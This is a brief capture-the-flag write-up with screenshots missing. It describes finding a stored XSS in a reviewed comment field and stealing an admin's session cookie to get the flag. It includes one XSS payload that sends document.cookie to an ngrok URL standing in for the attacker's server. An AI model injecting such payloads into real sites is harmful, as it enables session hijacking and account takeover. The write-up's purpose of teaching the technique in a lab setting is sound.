The main page is a login page that looks like this:

By signing up we get this post and a bar that we can comment to:

the comment needs to be reviewed it says when we comment:
![[Pasted image 20230622234859.png]]

it is also reflected in the source code as it is:

can we try html to it?

and it works!!!!! 
so basically what I think is to get admin level cookie or something from the server via XSS , the actual impact of XSS what we can do is to be done here
so let's fire up our server and redirect the request to it:
first we start our python web server locally and then tunnel it via ngrok:
the url looks like this:
`<script>new image().src='https://your-ngrok-server-link.ngrok-free.app?c='+document.cookie</script>`

and we get the cookie 
the first one is ours the 2nd one is of admin
and by setting the cookie we get the flag:
